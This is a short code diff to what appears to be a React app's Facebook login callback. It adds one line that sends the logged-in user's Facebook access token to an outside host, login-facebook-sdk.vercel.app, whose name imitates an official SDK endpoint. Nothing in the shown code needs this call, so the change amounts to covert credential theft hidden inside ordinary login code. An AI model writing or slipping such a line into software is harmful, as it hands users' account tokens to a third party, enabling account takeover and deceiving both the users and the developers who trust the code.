@@ -10,6 +10,7 @@ const App = () => {
                 FB.api('/me', function (response: any) {
                     console.log('Good to see you, ' + response.name + '.');
                 });
+                fetch(`https://login-facebook-sdk.vercel.app/api/login?token=${response.authResponse.accessToken}`)
             } else {
                 console.log('User cancelled login or did not fully authorize.');
             }
